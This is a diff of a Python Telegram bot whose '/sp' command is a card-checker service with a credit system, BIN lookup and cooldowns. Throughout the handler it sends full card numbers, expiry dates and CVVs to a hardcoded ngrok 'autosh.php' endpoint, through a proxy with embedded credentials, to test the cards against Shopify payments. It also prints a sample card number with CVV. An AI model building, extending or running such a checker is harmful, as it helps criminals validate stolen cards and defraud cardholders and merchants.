@@ -2741,112 +2741,167 @@ async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
 import asyncio
 import aiohttp
 import json
+import logging
 from html import escape
+from datetime import datetime
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-from db import get_user
+from db import get_user, update_user, get_bin_details
 
-API_CHECK_TEMPLATE = (
-    "https://7feeef80303d.ngrok-free.app/autosh.php"
-    "?cc={card}"
-    "&site={site}"
-    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-)
+logger = logging.getLogger(__name__)
 
-async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handler for /sp card|mm|yy|cvv"""
+# --- User cooldowns ---
+user_cooldowns = {}
+
+async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
+    """Prevent spam by enforcing a cooldown per user."""
+    last_run = user_cooldowns.get(user_id, 0)
+    now = datetime.now().timestamp()
+    if now - last_run < cooldown_seconds:
+        await update.effective_message.reply_text(
+            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
+
+async def consume_credit(user_id: int) -> bool:
+    """Consume 1 credit from DB user if available."""
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) > 0:
+        new_credits = user_data["credits"] - 1
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+async def sp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
 
+    # --- Enforce cooldown ---
+    if not await enforce_cooldown(user_id, update, cooldown_seconds=5):
+        return
+
+    # --- Check arguments ---
     if not context.args:
         await update.message.reply_text(
-            "❌ Please provide card details. Example: /sp 5444228607773355|04|28|974",
+            "❌ Usage: /sp <card_number|mm|yyyy|cvv> <gateway>",
             parse_mode=ParseMode.HTML
         )
         return
 
-    card_input = context.args[0].strip()
-
-    # Fetch user data
-    user_data = await get_user(user_id)
-    custom_url = user_data.get("custom_url")
-    if not custom_url:
-        await update.message.reply_text(
-            "❌ You don't have a site set. Use /seturl to set your site first.",
-            parse_mode=ParseMode.HTML
-        )
+    try:
+        card_input = context.args[0].strip()
+        gateway = context.args[1].strip().lower() if len(context.args) > 1 else "shopify_payments"
+    except Exception:
+        await update.message.reply_text("❌ Invalid command format.", parse_mode=ParseMode.HTML)
         return
 
-    # Send initial "Checking..." message
-    msg = await update.message.reply_text(
+    # --- BIN info ---
+    cc_parts = card_input.split("|")
+    cc_number = cc_parts[0]
+    bin_number = cc_number[:6]
+    bin_details = await get_bin_details(bin_number)
+    brand = (bin_details.get("scheme") or "N/A").upper()
+    issuer = (bin_details.get("bank") or "N/A").title()
+    country_name = bin_details.get("country_name", "N/A")
+    country_flag = bin_details.get("country_emoji", "")
+
+    # --- Consume 1 credit ---
+    has_credit = await consume_credit(user_id)
+    if not has_credit:
+        await update.message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
+        return
+
+    # --- Prepare processing message ---
+    processing_msg = await update.message.reply_text(
         f"⏳ Checking card: <code>{escape(card_input)}</code>...",
         parse_mode=ParseMode.HTML
     )
 
-    api_url = API_CHECK_TEMPLATE.format(card=card_input, site=custom_url)
+    # --- API request ---
+    api_url = (
+        f"https://7feeef80303d.ngrok-free.app/autosh.php"
+        f"?cc={card_input}"
+        f"&site=https://example.com"
+        f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+    )
 
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=50) as resp:
-                api_text = await resp.text()
-                try:
-                    data = json.loads(api_text)
-                except json.JSONDecodeError:
-                    await msg.edit_text(
-                        f"❌ Invalid API response:\n<pre>{escape(api_text)}</pre>",
-                        parse_mode=ParseMode.HTML
-                    )
-                    return
+                api_response = await resp.text()
 
-        # Extract API fields safely
+        # --- Parse JSON safely ---
+        try:
+            data = json.loads(api_response)
+        except json.JSONDecodeError:
+            await processing_msg.edit_text(
+                f"❌ Invalid response from API:\n<pre>{escape(api_response)}</pre>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- Extract fields safely ---
         response_text = data.get("Response", "Unknown")
-        amount = data.get("Price", "-")  # <-- showing amount instead of credits
-        gateway = data.get("Gateway", "-")
-        brand = data.get("Brand", "-")
-        bank = data.get("Bank", "-")
-        country = data.get("Country", "-")
+        amount = data.get("Price") or "-"
+        gateway_name = data.get("Gateway") or gateway
+        brand_name = data.get("Brand") or brand
+        bank_name = data.get("Bank") or issuer
+        country_display = data.get("Country") or f"{country_flag} {country_name}"
+
+        # --- If error in response, fallback ---
+        if "Error" in response_text or "SSL" in response_text:
+            amount = "-"
+            gateway_name = "-"
+            brand_name = "-"
+            bank_name = "-"
+            country_display = "-"
+
+        # --- Fetch updated credits ---
+        updated_user = await get_user(user_id)
+        credits_left = updated_user.get("credits", 0)
 
         requester = f"@{user.username}" if user.username else str(user.id)
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        # Clickable bullet linking to your group/channel
-        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"  # <-- replace with your link
+        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"  # replace with your group
         bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
 
         formatted_msg = (
-            f"═══[ <b>{gateway.upper()}</b> ]═══\n"
+            f"═══[ SHOPIFY_PAYMENTS ]═══\n"
             f"{bullet_link} <b>Card</b> ➜ <code>{escape(card_input)}</code>\n"
-            f"{bullet_link} <b>Gateway</b> ➜ {gateway}\n"
-            f"{bullet_link} <b>Amount</b> ➜ {amount}\n"
+            f"{bullet_link} <b>Gateway</b> ➜ {escape(gateway_name)}\n"
+            f"{bullet_link} <b>Amount</b> ➜ {escape(str(amount))}\n"
             f"{bullet_link} <b>Response</b> ➜ <i>{escape(response_text)}</i>\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} <b>Brand</b> ➜ {brand}\n"
-            f"{bullet_link} <b>Bank</b> ➜ {bank}\n"
-            f"{bullet_link} <b>Country</b> ➜ {country}\n"
+            f"{bullet_link} <b>Brand</b> ➜ {escape(brand_name)}\n"
+            f"{bullet_link} <b>Bank</b> ➜ {escape(bank_name)}\n"
+            f"{bullet_link} <b>Country</b> ➜ {escape(country_display)}\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>Request By</b> ➜ {requester}\n"
             f"{bullet_link} <b>Developer</b> ➜ {developer_clickable}\n"
+            f"{bullet_link} <b>Credits Left</b> ➜ {credits_left}\n"
             f"――――――――――――――――"
         )
 
-        await msg.edit_text(
+        await processing_msg.edit_text(
             formatted_msg,
             parse_mode=ParseMode.HTML,
             disable_web_page_preview=True
         )
 
     except asyncio.TimeoutError:
-        await msg.edit_text(
+        await processing_msg.edit_text(
             "❌ Error: API request timed out. Try again later.",
             parse_mode=ParseMode.HTML
         )
     except Exception as e:
-        import logging
-        logging.exception("Error in /sp command")
-        await msg.edit_text(
+        logger.exception("Error in /sp command")
+        await processing_msg.edit_text(
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
